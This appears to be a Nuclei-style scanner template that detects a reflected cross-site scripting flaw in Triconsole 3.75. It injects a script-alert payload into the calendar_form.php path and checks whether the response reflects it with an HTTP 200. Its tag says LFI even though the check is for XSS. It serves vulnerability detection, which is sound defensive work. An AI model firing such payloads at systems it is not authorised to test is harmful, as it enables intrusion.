id: triconsole-xss

info:
  name: Triconsole 3.75 XSS
  author: pikpikcu
  severity: medium
  reference: https://cxsecurity.com/issue/WLB-2021020168
  tags: triconsole,lfi

requests:
  - method: GET
    path:
      - '{{BaseURL}}/calendar_form.php/"><script>alert(document.domain)</script>'
    matchers-condition: and
    matchers:

      - type: word
        words:
          - "<script>alert(document.domain)</script>"
        part: body
        condition: and

      - type: status
        status:
          - 200
